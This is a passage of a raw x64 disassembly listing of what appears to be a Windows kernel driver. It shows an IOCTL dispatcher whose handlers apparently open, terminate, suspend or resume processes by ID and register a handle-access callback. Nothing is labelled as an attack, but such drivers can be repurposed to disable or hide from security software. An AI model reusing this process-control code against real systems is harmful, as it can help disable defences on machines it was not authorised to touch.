   140001767:	4c 8b f2             	mov    %rdx,%r14
   14000176a:	48 8b f1             	mov    %rcx,%rsi
   14000176d:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   140001772:	49 89 43 d8          	mov    %rax,-0x28(%r11)
   140001776:	48 85 c9             	test   %rcx,%rcx
   140001779:	0f 84 de 00 00 00    	je     0x14000185d
   14000177f:	48 8b 79 10          	mov    0x10(%rcx),%rdi
   140001783:	48 85 ff             	test   %rdi,%rdi
   140001786:	0f 84 d1 00 00 00    	je     0x14000185d
   14000178c:	48 8b 7f 08          	mov    0x8(%rdi),%rdi
   140001790:	48 85 ff             	test   %rdi,%rdi
   140001793:	0f 84 c4 00 00 00    	je     0x14000185d
   140001799:	8a 4f 4c             	mov    0x4c(%rdi),%cl
   14000179c:	33 d2                	xor    %edx,%edx
   14000179e:	ff 15 94 18 00 00    	call   *0x1894(%rip)        # 0x140003038
   1400017a4:	48 8b d8             	mov    %rax,%rbx
   1400017a7:	48 85 c0             	test   %rax,%rax
   1400017aa:	0f 84 ad 00 00 00    	je     0x14000185d
   1400017b0:	45 33 c0             	xor    %r8d,%r8d
   1400017b3:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400017b8:	41 8d 50 01          	lea    0x1(%r8),%edx
   1400017bc:	ff 15 56 18 00 00    	call   *0x1856(%rip)        # 0x140003018
   1400017c2:	4c 89 73 48          	mov    %r14,0x48(%rbx)
   1400017c6:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   1400017cb:	48 89 43 50          	mov    %rax,0x50(%rbx)
   1400017cf:	8b 84 24 90 00 00 00 	mov    0x90(%rsp),%eax
   1400017d6:	4c 89 7b 18          	mov    %r15,0x18(%rbx)
   1400017da:	c6 43 40 00          	movb   $0x0,0x40(%rbx)
   1400017de:	65 48 8b 0c 25 88 01 	mov    %gs:0x188,%rcx
   1400017e5:	00 00 
   1400017e7:	48 8b 93 b8 00 00 00 	mov    0xb8(%rbx),%rdx
   1400017ee:	48 89 8b 98 00 00 00 	mov    %rcx,0x98(%rbx)
   1400017f5:	48 8d 0d 84 00 00 00 	lea    0x84(%rip),%rcx        # 0x140001880
   1400017fc:	48 89 b3 c0 00 00 00 	mov    %rsi,0xc0(%rbx)
   140001803:	c6 42 b8 06          	movb   $0x6,-0x48(%rdx)
   140001807:	48 89 7a e0          	mov    %rdi,-0x20(%rdx)
   14000180b:	48 89 72 e8          	mov    %rsi,-0x18(%rdx)
   14000180f:	89 6a c0             	mov    %ebp,-0x40(%rdx)
   140001812:	89 42 c8             	mov    %eax,-0x38(%rdx)
   140001815:	48 8b d3             	mov    %rbx,%rdx
   140001818:	48 8b 83 b8 00 00 00 	mov    0xb8(%rbx),%rax
   14000181f:	48 83 60 f8 00       	andq   $0x0,-0x8(%rax)
   140001824:	48 89 48 f0          	mov    %rcx,-0x10(%rax)
   140001828:	48 8b cf             	mov    %rdi,%rcx
   14000182b:	c6 40 bb e0          	movb   $0xe0,-0x45(%rax)
   14000182f:	ff 15 0b 18 00 00    	call   *0x180b(%rip)        # 0x140003040
   140001835:	3d 03 01 00 00       	cmp    $0x103,%eax
   14000183a:	75 19                	jne    0x140001855
   14000183c:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140001842:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140001847:	45 33 c9             	xor    %r9d,%r9d
   14000184a:	45 33 c0             	xor    %r8d,%r8d
   14000184d:	33 d2                	xor    %edx,%edx
   14000184f:	ff 15 d3 17 00 00    	call   *0x17d3(%rip)        # 0x140003028
   140001855:	41 8b 06             	mov    (%r14),%eax
   140001858:	0f ae e8             	lfence
   14000185b:	eb 05                	jmp    0x140001862
   14000185d:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   140001862:	4c 8d 5c 24 50       	lea    0x50(%rsp),%r11
   140001867:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   14000186b:	49 8b 6b 28          	mov    0x28(%r11),%rbp
   14000186f:	49 8b 73 30          	mov    0x30(%r11),%rsi
   140001873:	49 8b e3             	mov    %r11,%rsp
   140001876:	41 5f                	pop    %r15
   140001878:	41 5e                	pop    %r14
   14000187a:	5f                   	pop    %rdi
   14000187b:	c3                   	ret
   14000187c:	cc                   	int3
   14000187d:	cc                   	int3
   14000187e:	cc                   	int3
   14000187f:	cc                   	int3
   140001880:	40 53                	rex push %rbx
   140001882:	48 83 ec 20          	sub    $0x20,%rsp
   140001886:	48 8b 42 48          	mov    0x48(%rdx),%rax
   14000188a:	48 8b da             	mov    %rdx,%rbx
   14000188d:	0f 10 42 30          	movups 0x30(%rdx),%xmm0
   140001891:	f3 0f 7f 00          	movdqu %xmm0,(%rax)
   140001895:	48 8b 4a 50          	mov    0x50(%rdx),%rcx
   140001899:	48 85 c9             	test   %rcx,%rcx
   14000189c:	74 0b                	je     0x1400018a9
   14000189e:	45 33 c0             	xor    %r8d,%r8d
   1400018a1:	33 d2                	xor    %edx,%edx
   1400018a3:	ff 15 77 17 00 00    	call   *0x1777(%rip)        # 0x140003020
   1400018a9:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   1400018ad:	48 85 c9             	test   %rcx,%rcx
   1400018b0:	74 0b                	je     0x1400018bd
   1400018b2:	ff 15 a0 17 00 00    	call   *0x17a0(%rip)        # 0x140003058
   1400018b8:	48 83 63 08 00       	andq   $0x0,0x8(%rbx)
   1400018bd:	48 8b cb             	mov    %rbx,%rcx
   1400018c0:	ff 15 8a 17 00 00    	call   *0x178a(%rip)        # 0x140003050
   1400018c6:	b8 16 00 00 c0       	mov    $0xc0000016,%eax
   1400018cb:	48 83 c4 20          	add    $0x20,%rsp
   1400018cf:	5b                   	pop    %rbx
   1400018d0:	c3                   	ret
   1400018d1:	cc                   	int3
   1400018d2:	cc                   	int3
   1400018d3:	cc                   	int3
   1400018d4:	cc                   	int3
   1400018d5:	cc                   	int3
   1400018d6:	cc                   	int3
   1400018d7:	cc                   	int3
   1400018d8:	cc                   	int3
   1400018d9:	cc                   	int3
   1400018da:	cc                   	int3
   1400018db:	cc                   	int3
   1400018dc:	cc                   	int3
   1400018dd:	cc                   	int3
   1400018de:	cc                   	int3
   1400018df:	cc                   	int3
   1400018e0:	48 83 ec 28          	sub    $0x28,%rsp
   1400018e4:	83 62 30 00          	andl   $0x0,0x30(%rdx)
   1400018e8:	48 8b ca             	mov    %rdx,%rcx
   1400018eb:	48 83 62 38 00       	andq   $0x0,0x38(%rdx)
   1400018f0:	33 d2                	xor    %edx,%edx
   1400018f2:	ff 15 98 17 00 00    	call   *0x1798(%rip)        # 0x140003090
   1400018f8:	33 c0                	xor    %eax,%eax
   1400018fa:	48 83 c4 28          	add    $0x28,%rsp
   1400018fe:	c3                   	ret
   1400018ff:	cc                   	int3
   140001900:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001905:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000190a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000190f:	57                   	push   %rdi
   140001910:	48 83 ec 20          	sub    $0x20,%rsp
   140001914:	48 8b 82 b8 00 00 00 	mov    0xb8(%rdx),%rax
   14000191b:	48 8b fa             	mov    %rdx,%rdi
   14000191e:	48 8b 52 18          	mov    0x18(%rdx),%rdx
   140001922:	33 db                	xor    %ebx,%ebx
   140001924:	be 0d 00 00 c0       	mov    $0xc000000d,%esi
   140001929:	8b 48 18             	mov    0x18(%rax),%ecx
   14000192c:	8b 68 08             	mov    0x8(%rax),%ebp
   14000192f:	48 85 d2             	test   %rdx,%rdx
   140001932:	74 13                	je     0x140001947
   140001934:	44 8b 40 10          	mov    0x10(%rax),%r8d
   140001938:	45 85 c0             	test   %r8d,%r8d
   14000193b:	74 0a                	je     0x140001947
   14000193d:	0f ae e8             	lfence
   140001940:	e8 ff 02 00 00       	call   0x140001c44
   140001945:	8b f0                	mov    %eax,%esi
   140001947:	85 f6                	test   %esi,%esi
   140001949:	89 77 30             	mov    %esi,0x30(%rdi)
   14000194c:	0f 44 dd             	cmove  %ebp,%ebx
   14000194f:	33 d2                	xor    %edx,%edx
   140001951:	8b cb                	mov    %ebx,%ecx
   140001953:	48 89 4f 38          	mov    %rcx,0x38(%rdi)
   140001957:	48 8b cf             	mov    %rdi,%rcx
   14000195a:	ff 15 30 17 00 00    	call   *0x1730(%rip)        # 0x140003090
   140001960:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001965:	8b c6                	mov    %esi,%eax
   140001967:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000196c:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140001971:	48 83 c4 20          	add    $0x20,%rsp
   140001975:	5f                   	pop    %rdi
   140001976:	c3                   	ret
   140001977:	cc                   	int3
   140001978:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   14000197d:	55                   	push   %rbp
   14000197e:	48 8d 6c 24 a9       	lea    -0x57(%rsp),%rbp
   140001983:	48 81 ec b0 00 00 00 	sub    $0xb0,%rsp
   14000198a:	48 8b 41 28          	mov    0x28(%rcx),%rax
   14000198e:	48 8d 15 0b 0e 00 00 	lea    0xe0b(%rip),%rdx        # 0x1400027a0
   140001995:	48 83 65 67 00       	andq   $0x0,0x67(%rbp)
   14000199a:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000199d:	0f 57 c9             	xorps  %xmm1,%xmm1
   1400019a0:	48 8b d9             	mov    %rcx,%rbx
   1400019a3:	0f 11 45 f7          	movups %xmm0,-0x9(%rbp)
   1400019a7:	48 8d 4d 2f          	lea    0x2f(%rbp),%rcx
   1400019ab:	0f 11 4d e7          	movups %xmm1,-0x19(%rbp)
   1400019af:	83 48 68 20          	orl    $0x20,0x68(%rax)
   1400019b3:	48 8b 05 3e 17 00 00 	mov    0x173e(%rip),%rax        # 0x1400030f8
   1400019ba:	48 83 65 1f 00       	andq   $0x0,0x1f(%rbp)
   1400019bf:	48 89 45 07          	mov    %rax,0x7(%rbp)
   1400019c3:	48 8d 05 a6 04 00 00 	lea    0x4a6(%rip),%rax        # 0x140001e70
   1400019ca:	48 89 45 17          	mov    %rax,0x17(%rbp)
   1400019ce:	48 8d 45 07          	lea    0x7(%rbp),%rax
   1400019d2:	48 89 45 47          	mov    %rax,0x47(%rbp)
   1400019d6:	c7 45 0f 03 00 00 00 	movl   $0x3,0xf(%rbp)
   1400019dd:	c7 45 27 00 01 01 00 	movl   $0x10100,0x27(%rbp)
   1400019e4:	ff 15 26 16 00 00    	call   *0x1626(%rip)        # 0x140003010
   1400019ea:	48 83 65 3f 00       	andq   $0x0,0x3f(%rbp)
   1400019ef:	48 8d 15 1a 26 00 00 	lea    0x261a(%rip),%rdx        # 0x140004010
   1400019f6:	48 8d 4d 27          	lea    0x27(%rbp),%rcx
   1400019fa:	ff 15 b8 16 00 00    	call   *0x16b8(%rip)        # 0x1400030b8
   140001a00:	48 8d 05 d9 fe ff ff 	lea    -0x127(%rip),%rax        # 0x1400018e0
   140001a07:	48 89 43 70          	mov    %rax,0x70(%rbx)
   140001a0b:	48 8d 15 9e 0d 00 00 	lea    0xd9e(%rip),%rdx        # 0x1400027b0
   140001a12:	48 8d 05 c7 fe ff ff 	lea    -0x139(%rip),%rax        # 0x1400018e0
   140001a19:	48 89 83 80 00 00 00 	mov    %rax,0x80(%rbx)
   140001a20:	48 8d 4d e7          	lea    -0x19(%rbp),%rcx
   140001a24:	48 8d 05 d5 fe ff ff 	lea    -0x12b(%rip),%rax        # 0x140001900
   140001a2b:	48 89 83 e0 00 00 00 	mov    %rax,0xe0(%rbx)
   140001a32:	48 8d 05 87 00 00 00 	lea    0x87(%rip),%rax        # 0x140001ac0
   140001a39:	48 89 43 68          	mov    %rax,0x68(%rbx)
   140001a3d:	ff 15 cd 15 00 00    	call   *0x15cd(%rip)        # 0x140003010
   140001a43:	48 8d 45 67          	lea    0x67(%rbp),%rax
   140001a47:	41 b9 22 00 00 00    	mov    $0x22,%r9d
   140001a4d:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140001a52:	4c 8d 45 e7          	lea    -0x19(%rbp),%r8
   140001a56:	c6 44 24 28 00       	movb   $0x0,0x28(%rsp)
   140001a5b:	33 d2                	xor    %edx,%edx
   140001a5d:	83 64 24 20 00       	andl   $0x0,0x20(%rsp)
   140001a62:	48 8b cb             	mov    %rbx,%rcx
   140001a65:	ff 15 2d 16 00 00    	call   *0x162d(%rip)        # 0x140003098
   140001a6b:	85 c0                	test   %eax,%eax
   140001a6d:	78 36                	js     0x140001aa5
   140001a6f:	48 8d 15 da 0c 00 00 	lea    0xcda(%rip),%rdx        # 0x140002750
   140001a76:	48 8d 4d f7          	lea    -0x9(%rbp),%rcx
   140001a7a:	ff 15 90 15 00 00    	call   *0x1590(%rip)        # 0x140003010
   140001a80:	48 8d 55 e7          	lea    -0x19(%rbp),%rdx
   140001a84:	48 8d 4d f7          	lea    -0x9(%rbp),%rcx
   140001a88:	ff 15 12 16 00 00    	call   *0x1612(%rip)        # 0x1400030a0
   140001a8e:	8b d8                	mov    %eax,%ebx
   140001a90:	85 c0                	test   %eax,%eax
   140001a92:	79 11                	jns    0x140001aa5
   140001a94:	0f ae e8             	lfence
   140001a97:	48 8b 4d 67          	mov    0x67(%rbp),%rcx
   140001a9b:	ff 15 07 16 00 00    	call   *0x1607(%rip)        # 0x1400030a8
   140001aa1:	8b c3                	mov    %ebx,%eax
   140001aa3:	eb 03                	jmp    0x140001aa8
   140001aa5:	0f ae e8             	lfence
   140001aa8:	48 8b 9c 24 c8 00 00 	mov    0xc8(%rsp),%rbx
   140001aaf:	00 
   140001ab0:	48 81 c4 b0 00 00 00 	add    $0xb0,%rsp
   140001ab7:	5d                   	pop    %rbp
   140001ab8:	c3                   	ret
   140001ab9:	cc                   	int3
   140001aba:	cc                   	int3
   140001abb:	cc                   	int3
   140001abc:	cc                   	int3
   140001abd:	cc                   	int3
   140001abe:	cc                   	int3
   140001abf:	cc                   	int3
   140001ac0:	40 53                	rex push %rbx
   140001ac2:	48 83 ec 30          	sub    $0x30,%rsp
   140001ac6:	48 8b d9             	mov    %rcx,%rbx
   140001ac9:	48 8d 15 80 0c 00 00 	lea    0xc80(%rip),%rdx        # 0x140002750
   140001ad0:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001ad5:	ff 15 35 15 00 00    	call   *0x1535(%rip)        # 0x140003010
   140001adb:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001ae0:	ff 15 ca 15 00 00    	call   *0x15ca(%rip)        # 0x1400030b0
   140001ae6:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140001aea:	ff 15 b8 15 00 00    	call   *0x15b8(%rip)        # 0x1400030a8
   140001af0:	48 8b 0d 19 25 00 00 	mov    0x2519(%rip),%rcx        # 0x140004010
   140001af7:	ff 15 c3 15 00 00    	call   *0x15c3(%rip)        # 0x1400030c0
   140001afd:	48 8d 0d 7c 0c 00 00 	lea    0xc7c(%rip),%rcx        # 0x140002780
   140001b04:	e8 34 04 00 00       	call   0x140001f3d
   140001b09:	48 83 c4 30          	add    $0x30,%rsp
   140001b0d:	5b                   	pop    %rbx
   140001b0e:	c3                   	ret
   140001b0f:	cc                   	int3
   140001b10:	40 53                	rex push %rbx
   140001b12:	48 83 ec 20          	sub    $0x20,%rsp
   140001b16:	33 db                	xor    %ebx,%ebx
   140001b18:	48 8d 54 24 38       	lea    0x38(%rsp),%rdx
   140001b1d:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   140001b22:	ff 15 b8 15 00 00    	call   *0x15b8(%rip)        # 0x1400030e0
   140001b28:	85 c0                	test   %eax,%eax
   140001b2a:	48 0f 49 5c 24 38    	cmovns 0x38(%rsp),%rbx
   140001b30:	48 8b c3             	mov    %rbx,%rax
   140001b33:	48 83 c4 20          	add    $0x20,%rsp
   140001b37:	5b                   	pop    %rbx
   140001b38:	c3                   	ret
   140001b39:	cc                   	int3
   140001b3a:	cc                   	int3
   140001b3b:	cc                   	int3
   140001b3c:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140001b41:	55                   	push   %rbp
   140001b42:	48 8b ec             	mov    %rsp,%rbp
   140001b45:	48 83 ec 60          	sub    $0x60,%rsp
   140001b49:	48 83 65 10 00       	andq   $0x0,0x10(%rbp)
   140001b4e:	4c 8d 4d c0          	lea    -0x40(%rbp),%r9
   140001b52:	48 83 65 c8 00       	andq   $0x0,-0x38(%rbp)
   140001b57:	4c 8d 45 d0          	lea    -0x30(%rbp),%r8
   140001b5b:	83 65 e8 00          	andl   $0x0,-0x18(%rbp)
   140001b5f:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001b62:	48 89 4d c0          	mov    %rcx,-0x40(%rbp)
   140001b66:	0f 57 c9             	xorps  %xmm1,%xmm1
   140001b69:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   140001b6d:	c7 45 d0 30 00 00 00 	movl   $0x30,-0x30(%rbp)
   140001b74:	ba 01 00 00 00       	mov    $0x1,%edx
   140001b79:	f3 0f 7f 45 d8       	movdqu %xmm0,-0x28(%rbp)
   140001b7e:	f3 0f 7f 4d f0       	movdqu %xmm1,-0x10(%rbp)
   140001b83:	ff 15 4f 15 00 00    	call   *0x154f(%rip)        # 0x1400030d8
   140001b89:	8b d8                	mov    %eax,%ebx
   140001b8b:	0f ae e8             	lfence
   140001b8e:	8b 55 10             	mov    0x10(%rbp),%edx
   140001b91:	85 c0                	test   %eax,%eax
   140001b93:	78 24                	js     0x140001bb9
   140001b95:	48 8d 0d 14 0a 00 00 	lea    0xa14(%rip),%rcx        # 0x1400025b0
   140001b9c:	e8 9c 03 00 00       	call   0x140001f3d
   140001ba1:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   140001ba5:	33 d2                	xor    %edx,%edx
   140001ba7:	ff 15 23 15 00 00    	call   *0x1523(%rip)        # 0x1400030d0
   140001bad:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   140001bb1:	ff 15 b1 14 00 00    	call   *0x14b1(%rip)        # 0x140003068
   140001bb7:	eb 0c                	jmp    0x140001bc5
   140001bb9:	48 8d 0d 20 0a 00 00 	lea    0xa20(%rip),%rcx        # 0x1400025e0
   140001bc0:	e8 78 03 00 00       	call   0x140001f3d
   140001bc5:	8b c3                	mov    %ebx,%eax
   140001bc7:	48 8b 5c 24 78       	mov    0x78(%rsp),%rbx
   140001bcc:	48 83 c4 60          	add    $0x60,%rsp
   140001bd0:	5d                   	pop    %rbp
   140001bd1:	c3                   	ret
   140001bd2:	cc                   	int3
   140001bd3:	cc                   	int3
   140001bd4:	40 55                	rex push %rbp
   140001bd6:	48 8b ec             	mov    %rsp,%rbp
   140001bd9:	48 83 ec 60          	sub    $0x60,%rsp
   140001bdd:	48 83 65 10 00       	andq   $0x0,0x10(%rbp)
   140001be2:	4c 8d 4d c0          	lea    -0x40(%rbp),%r9
   140001be6:	48 83 65 c8 00       	andq   $0x0,-0x38(%rbp)
   140001beb:	4c 8d 45 d0          	lea    -0x30(%rbp),%r8
   140001bef:	83 65 e8 00          	andl   $0x0,-0x18(%rbp)
   140001bf3:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001bf6:	48 89 4d c0          	mov    %rcx,-0x40(%rbp)
   140001bfa:	0f 57 c9             	xorps  %xmm1,%xmm1
   140001bfd:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   140001c01:	c7 45 d0 30 00 00 00 	movl   $0x30,-0x30(%rbp)
   140001c08:	ba 01 00 00 00       	mov    $0x1,%edx
   140001c0d:	f3 0f 7f 45 d8       	movdqu %xmm0,-0x28(%rbp)
   140001c12:	f3 0f 7f 4d f0       	movdqu %xmm1,-0x10(%rbp)
   140001c17:	ff 15 bb 14 00 00    	call   *0x14bb(%rip)        # 0x1400030d8
   140001c1d:	8b 55 10             	mov    0x10(%rbp),%edx
   140001c20:	48 8d 0d 29 09 00 00 	lea    0x929(%rip),%rcx        # 0x140002550
   140001c27:	85 c0                	test   %eax,%eax
   140001c29:	79 07                	jns    0x140001c32
   140001c2b:	48 8d 0d 4e 09 00 00 	lea    0x94e(%rip),%rcx        # 0x140002580
   140001c32:	e8 06 03 00 00       	call   0x140001f3d
   140001c37:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140001c3b:	48 83 c4 60          	add    $0x60,%rsp
   140001c3f:	5d                   	pop    %rbp
   140001c40:	c3                   	ret
   140001c41:	cc                   	int3
   140001c42:	cc                   	int3
   140001c43:	cc                   	int3
   140001c44:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001c49:	48 89 7c 24 10       	mov    %rdi,0x10(%rsp)
   140001c4e:	55                   	push   %rbp
   140001c4f:	48 8b ec             	mov    %rsp,%rbp
   140001c52:	48 83 ec 40          	sub    $0x40,%rsp
   140001c56:	44 8b c1             	mov    %ecx,%r8d
   140001c59:	bf 0d 00 00 c0       	mov    $0xc000000d,%edi
   140001c5e:	41 81 e8 00 20 22 00 	sub    $0x222000,%r8d
   140001c65:	0f 84 c5 01 00 00    	je     0x140001e30
   140001c6b:	b8 04 00 00 00       	mov    $0x4,%eax
   140001c70:	44 2b c0             	sub    %eax,%r8d
   140001c73:	0f 84 a7 01 00 00    	je     0x140001e20
   140001c79:	44 2b c0             	sub    %eax,%r8d
   140001c7c:	0f 84 81 01 00 00    	je     0x140001e03
   140001c82:	44 2b c0             	sub    %eax,%r8d
   140001c85:	0f 84 5e 01 00 00    	je     0x140001de9
   140001c8b:	44 2b c0             	sub    %eax,%r8d
   140001c8e:	0f 84 3a 01 00 00    	je     0x140001dce
   140001c94:	44 2b c0             	sub    %eax,%r8d
   140001c97:	0f 84 f7 00 00 00    	je     0x140001d94
   140001c9d:	44 2b c0             	sub    %eax,%r8d
   140001ca0:	0f 84 ad 00 00 00    	je     0x140001d53
   140001ca6:	44 2b c0             	sub    %eax,%r8d
   140001ca9:	74 6b                	je     0x140001d16
   140001cab:	44 3b c0             	cmp    %eax,%r8d
   140001cae:	74 18                	je     0x140001cc8
   140001cb0:	8b d1                	mov    %ecx,%edx
   140001cb2:	48 8d 0d 77 0a 00 00 	lea    0xa77(%rip),%rcx        # 0x140002730
   140001cb9:	e8 7f 02 00 00       	call   0x140001f3d
   140001cbe:	bf 01 00 00 c0       	mov    $0xc0000001,%edi
   140001cc3:	e9 8b 01 00 00       	jmp    0x140001e53
   140001cc8:	48 8b 02             	mov    (%rdx),%rax
   140001ccb:	48 8d 0d 3e 0a 00 00 	lea    0xa3e(%rip),%rcx        # 0x140002710
   140001cd2:	8b d0                	mov    %eax,%edx
   140001cd4:	8b d8                	mov    %eax,%ebx
   140001cd6:	e8 62 02 00 00       	call   0x140001f3d
   140001cdb:	8b cb                	mov    %ebx,%ecx
   140001cdd:	bf 01 00 00 c0       	mov    $0xc0000001,%edi
   140001ce2:	e8 29 fe ff ff       	call   0x140001b10
   140001ce7:	48 8b d8             	mov    %rax,%rbx
   140001cea:	48 85 c0             	test   %rax,%rax
   140001ced:	0f 84 60 01 00 00    	je     0x140001e53
   140001cf3:	48 8b c8             	mov    %rax,%rcx
   140001cf6:	ff 15 f4 13 00 00    	call   *0x13f4(%rip)        # 0x1400030f0
   140001cfc:	48 8d 0d 1d 09 00 00 	lea    0x91d(%rip),%rcx        # 0x140002620
   140001d03:	e8 35 02 00 00       	call   0x140001f3d
   140001d08:	48 8b cb             	mov    %rbx,%rcx
   140001d0b:	ff 15 f7 12 00 00    	call   *0x12f7(%rip)        # 0x140003008
   140001d11:	e9 3b 01 00 00       	jmp    0x140001e51
   140001d16:	48 8b 02             	mov    (%rdx),%rax
   140001d19:	48 8d 0d d0 09 00 00 	lea    0x9d0(%rip),%rcx        # 0x1400026f0
   140001d20:	8b d0                	mov    %eax,%edx
   140001d22:	8b d8                	mov    %eax,%ebx
   140001d24:	e8 14 02 00 00       	call   0x140001f3d
   140001d29:	8b cb                	mov    %ebx,%ecx
   140001d2b:	bf 01 00 00 c0       	mov    $0xc0000001,%edi
   140001d30:	e8 db fd ff ff       	call   0x140001b10
   140001d35:	48 8b d8             	mov    %rax,%rbx
   140001d38:	48 85 c0             	test   %rax,%rax
   140001d3b:	0f 84 12 01 00 00    	je     0x140001e53
   140001d41:	48 8b c8             	mov    %rax,%rcx
   140001d44:	ff 15 9e 13 00 00    	call   *0x139e(%rip)        # 0x1400030e8
   140001d4a:	48 8d 0d bf 08 00 00 	lea    0x8bf(%rip),%rcx        # 0x140002610
   140001d51:	eb b0                	jmp    0x140001d03
   140001d53:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001d56:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140001d5a:	0f 11 45 e0          	movups %xmm0,-0x20(%rbp)
   140001d5e:	ff 15 ac 12 00 00    	call   *0x12ac(%rip)        # 0x140003010
   140001d64:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
   140001d68:	48 8d 0d 61 09 00 00 	lea    0x961(%rip),%rcx        # 0x1400026d0
   140001d6f:	e8 c9 01 00 00       	call   0x140001f3d
   140001d74:	0f 28 45 e0          	movaps -0x20(%rbp),%xmm0
   140001d78:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140001d7c:	66 0f 7f 45 f0       	movdqa %xmm0,-0x10(%rbp)
   140001d81:	e8 2a f4 ff ff       	call   0x1400011b0
   140001d86:	48 85 c0             	test   %rax,%rax
   140001d89:	0f 84 c4 00 00 00    	je     0x140001e53
   140001d8f:	e9 bd 00 00 00       	jmp    0x140001e51
   140001d94:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001d97:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140001d9b:	0f 11 45 e0          	movups %xmm0,-0x20(%rbp)
   140001d9f:	ff 15 6b 12 00 00    	call   *0x126b(%rip)        # 0x140003010
   140001da5:	0f 28 45 e0          	movaps -0x20(%rbp),%xmm0
   140001da9:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140001dad:	66 0f 7f 45 f0       	movdqa %xmm0,-0x10(%rbp)
   140001db2:	e8 49 f2 ff ff       	call   0x140001000
   140001db7:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
   140001dbb:	8b f8                	mov    %eax,%edi
   140001dbd:	48 8d 0d ec 08 00 00 	lea    0x8ec(%rip),%rcx        # 0x1400026b0
   140001dc4:	e8 74 01 00 00       	call   0x140001f3d
   140001dc9:	e9 85 00 00 00       	jmp    0x140001e53
   140001dce:	48 8b 1a             	mov    (%rdx),%rbx
   140001dd1:	48 8d 0d b8 08 00 00 	lea    0x8b8(%rip),%rcx        # 0x140002690
   140001dd8:	8b d3                	mov    %ebx,%edx
   140001dda:	e8 5e 01 00 00       	call   0x140001f3d
   140001ddf:	48 8b cb             	mov    %rbx,%rcx
   140001de2:	e8 ed fd ff ff       	call   0x140001bd4
   140001de7:	eb 9d                	jmp    0x140001d86
   140001de9:	48 8b 1a             	mov    (%rdx),%rbx
   140001dec:	48 8d 0d 7d 08 00 00 	lea    0x87d(%rip),%rcx        # 0x140002670
   140001df3:	8b d3                	mov    %ebx,%edx
   140001df5:	e8 43 01 00 00       	call   0x140001f3d
   140001dfa:	48 89 1d 17 22 00 00 	mov    %rbx,0x2217(%rip)        # 0x140004018
   140001e01:	eb 4e                	jmp    0x140001e51
   140001e03:	48 8b 1a             	mov    (%rdx),%rbx
   140001e06:	48 8d 0d 43 08 00 00 	lea    0x843(%rip),%rcx        # 0x140002650
   140001e0d:	8b d3                	mov    %ebx,%edx
   140001e0f:	e8 29 01 00 00       	call   0x140001f3d
   140001e14:	48 8b cb             	mov    %rbx,%rcx
   140001e17:	e8 20 fd ff ff       	call   0x140001b3c
   140001e1c:	8b f8                	mov    %eax,%edi
   140001e1e:	eb 33                	jmp    0x140001e53
   140001e20:	8b 12                	mov    (%rdx),%edx
   140001e22:	48 8d 0d 17 08 00 00 	lea    0x817(%rip),%rcx        # 0x140002640
   140001e29:	e8 0f 01 00 00       	call   0x140001f3d
   140001e2e:	eb 21                	jmp    0x140001e51
   140001e30:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001e33:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140001e37:	0f 11 45 e0          	movups %xmm0,-0x20(%rbp)
   140001e3b:	ff 15 cf 11 00 00    	call   *0x11cf(%rip)        # 0x140003010
   140001e41:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
   140001e45:	48 8d 0d e4 07 00 00 	lea    0x7e4(%rip),%rcx        # 0x140002630
   140001e4c:	e8 ec 00 00 00       	call   0x140001f3d
   140001e51:	33 ff                	xor    %edi,%edi
   140001e53:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140001e58:	8b c7                	mov    %edi,%eax
   140001e5a:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   140001e5f:	48 83 c4 40          	add    $0x40,%rsp
   140001e63:	5d                   	pop    %rbp
   140001e64:	c3                   	ret
   140001e65:	cc                   	int3
   140001e66:	cc                   	int3
   140001e67:	cc                   	int3
   140001e68:	cc                   	int3
   140001e69:	cc                   	int3
   140001e6a:	cc                   	int3
   140001e6b:	cc                   	int3
   140001e6c:	cc                   	int3
   140001e6d:	cc                   	int3
   140001e6e:	cc                   	int3
   140001e6f:	cc                   	int3
   140001e70:	40 53                	rex push %rbx
   140001e72:	48 83 ec 20          	sub    $0x20,%rsp
   140001e76:	48 8b 4a 08          	mov    0x8(%rdx),%rcx
   140001e7a:	48 8b da             	mov    %rdx,%rbx
   140001e7d:	ff 15 45 12 00 00    	call   *0x1245(%rip)        # 0x1400030c8
   140001e83:	48 3b 05 8e 21 00 00 	cmp    0x218e(%rip),%rax        # 0x140004018
